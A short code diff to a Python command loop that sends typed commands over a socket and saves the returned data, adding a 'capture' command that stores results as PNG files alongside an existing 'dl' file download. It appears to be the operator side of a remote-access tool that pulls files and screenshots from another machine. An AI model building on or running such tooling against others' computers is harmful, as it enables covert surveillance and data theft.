@@ -52,6 +52,8 @@ while True:
     command_split = command.split(' ')
     if len(command_split) == 2 and command_split[0] == "dl":
         dl_filename = command_split[1]
+    if len(command_split) == 2 and command_split[0] == "capture":
+        dl_filename = command_split[1]+".png"
 
     data = send_command_and_receive_all_data(connection_socket, command)
     if not data:
@@ -61,7 +63,7 @@ while True:
         if len(data) == 1 and data == b" ":
             print(f"The file '{command_split[1]}' does not exist")
         else:
-            f = open(command_split[1], "wb")
+            f = open(dl_filename, "wb")
             f.write(data)
             f.close()
             print("File",dl_filename,"download")
